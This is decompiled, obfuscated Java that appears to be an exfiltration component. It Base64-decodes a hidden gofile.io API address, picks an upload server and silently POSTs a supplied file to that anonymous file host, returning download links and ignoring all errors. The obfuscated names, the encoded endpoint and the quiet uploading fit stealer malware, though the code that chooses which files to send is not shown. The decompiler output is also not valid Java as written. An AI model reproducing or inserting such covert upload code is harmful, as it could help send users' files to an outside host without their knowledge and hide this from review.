package 0.0.0.0;

import com.google.gson.JsonObject;
import com.google.gson.JsonParser;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.io.PrintWriter;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Base64;

public class 0o {
   public static String 0;
   public static String 1;

   public static String _/* $FF was: 0*/() {
      String base64Url = "aHR0cHM6Ly9hcGkuZ29maWxlLmlvL3NlcnZlcnM=";
      byte[] decodedBytes = Base64.getDecoder().decode(base64Url);
      String decodedUrl = new String(decodedBytes);

      try {
         URL url = new URL(decodedUrl);
         HttpURLConnection connection = (HttpURLConnection)url.openConnection();
         connection.setRequestMethod("GET");
         int responseCode = connection.getResponseCode();
         if (responseCode == 200) {
            BufferedReader reader = new BufferedReader(new InputStreamReader(connection.getInputStream()));
            StringBuilder responseBuilder = new StringBuilder();

            while(true) {
               String line;
               String var10000 = line = reader.readLine();

               try {
                  if (var10000 == null) {
                     break;
                  }

                  responseBuilder.append(line);
               } catch (IOException var11) {
                  throw var11;
               }
            }

            reader.close();
            String response = responseBuilder.toString();
            JsonObject jsonResponse = JsonParser.parseString(response).getAsJsonObject();
            return jsonResponse.getAsJsonObject("data").getAsJsonArray("servers").get(0).getAsJsonObject().get("name").getAsString();
         }

         connection.disconnect();
      } catch (IOException var12) {
      }

      return null;
   }

   public static String[] _/* $FF was: 0*/(File fileToUpload) {
      String serverUrl = 0();

      try {
         if (serverUrl == null) {
            return new String[2];
         }
      } catch (Throwable var143) {
         throw var143;
      }

      String[] downloadLinks = new String[2];
      boolean uploadSuccessful = false;

      for(int i = 0; i < 2; ++i) {
         try {
            String boundary = "*****" + Long.toHexString(System.currentTimeMillis()) + "*****";
            String A = "https://";
            String B = ".gofile.io/uploadFile";
            URL url = new URL(A + serverUrl + B);
            HttpURLConnection connection = (HttpURLConnection)url.openConnection();
            connection.setRequestMethod("POST");
            connection.setDoOutput(true);
            connection.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
            OutputStream outputStream = connection.getOutputStream();
            Throwable var11 = null;

            try {
               PrintWriter writer = new PrintWriter(new OutputStreamWriter(outputStream, "UTF-8"), true);
               Throwable var13 = null;
               boolean var98 = false;

               try {
                  var98 = true;
                  writer.append("--").append(boundary).append("\r\n");
                  writer.append("Content-Disposition: form-data; name=\"file\"; filename=\"").append(fileToUpload.getName()).append("\"\r\n");
                  writer.append("Content-Type: ").append("application/octet-stream").append("\r\n");
                  writer.append("\r\n").flush();
                  FileInputStream fileInputStream = new FileInputStream(fileToUpload);
                  Throwable var15 = null;
                  boolean var121 = false;

                  try {
                     var121 = true;
                     byte[] buffer = new byte[4096];

                     while(true) {
                        int bytesRead;
                        int var10000 = bytesRead = fileInputStream.read(buffer);

                        try {
                           if (var10000 != -1) {
                              outputStream.write(buffer, 0, bytesRead);
                              continue;
                           }
                        } catch (Throwable var135) {
                           throw var135;
                        }

                        outputStream.flush();
                        var121 = false;
                        break;
                     }
                  } catch (Throwable var136) {
                     var15 = var136;
                     throw var136;
                  } finally {
                     if (var121) {
                        label998: {
                           label997: {
                              try {
                                 if (fileInputStream == null) {
                                    break label998;
                                 }

                                 if (var15 != null) {
                                    break label997;
                                 }
                              } catch (Throwable var134) {
                                 throw var134;
                              }

                              fileInputStream.close();
                              break label998;
                           }

                           try {
                              fileInputStream.close();
                           } catch (Throwable var125) {
                              var15.addSuppressed(var125);
                           }
                        }

                     }
                  }

                  if (fileInputStream != null) {
                     if (var15 != null) {
                        try {
                           fileInputStream.close();
                        } catch (Throwable var127) {
                           var15.addSuppressed(var127);
                        }
                     } else {
                        fileInputStream.close();
                     }
                  }

                  writer.append("\r\n").flush();
                  writer.append("--").append(boundary).append("--").append("\r\n").flush();
                  var98 = false;
               } catch (Throwable var138) {
                  var13 = var138;
                  throw var138;
               } finally {
                  if (var98) {
                     label988: {
                        label987: {
                           try {
                              if (writer == null) {
                                 break label988;
                              }

                              if (var13 == null) {
                                 break label987;
                              }
                           } catch (Throwable var133) {
                              throw var133;
                           }

                           try {
                              writer.close();
                           } catch (Throwable var124) {
                              var13.addSuppressed(var124);
                           }
                           break label988;
                        }

                        writer.close();
                     }

                  }
               }

               if (writer != null) {
                  if (var13 != null) {
                     try {
                        writer.close();
                     } catch (Throwable var126) {
                        var13.addSuppressed(var126);
                     }
                  } else {
                     writer.close();
                  }
               }
            } catch (Throwable var140) {
               var11 = var140;
               throw var140;
            } finally {
               label978: {
                  label977: {
                     try {
                        if (outputStream == null) {
                           break label978;
                        }

                        if (var11 == null) {
                           break label977;
                        }
                     } catch (Throwable var132) {
                        throw var132;
                     }

                     try {
                        outputStream.close();
                     } catch (Throwable var123) {
                        var11.addSuppressed(var123);
                     }
                     break label978;
                  }

                  outputStream.close();
               }

            }

            int responseCode = connection.getResponseCode();
            if (responseCode == 200) {
               BufferedReader reader = new BufferedReader(new InputStreamReader(connection.getInputStream()));
               Throwable var146 = null;

               try {
                  StringBuilder responseBuilder = new StringBuilder();

                  while(true) {
                     String line;
                     String var150 = line = reader.readLine();

                     try {
                        if (var150 == null) {
                           break;
                        }

                        responseBuilder.append(line);
                     } catch (Throwable var129) {
                        throw var129;
                     }
                  }

                  String response = responseBuilder.toString();
                  JsonObject jsonResponse = JsonParser.parseString(response).getAsJsonObject();
                  JsonObject dataObject = jsonResponse.getAsJsonObject("data");
                  downloadLinks[i] = dataObject.get("downloadPage").getAsString();
                  uploadSuccessful = true;
                  break;
               } catch (Throwable var130) {
                  var146 = var130;
                  throw var130;
               } finally {
                  label955: {
                     label954: {
                        try {
                           if (reader == null) {
                              break label955;
                           }

                           if (var146 == null) {
                              break label954;
                           }
                        } catch (Throwable var128) {
                           throw var128;
                        }

                        try {
                           reader.close();
                        } catch (Throwable var122) {
                           var146.addSuppressed(var122);
                        }
                        break label955;
                     }

                     reader.close();
                  }

               }
            }

            connection.disconnect();
         } catch (IOException var142) {
         }
      }

      return downloadLinks;
   }
}
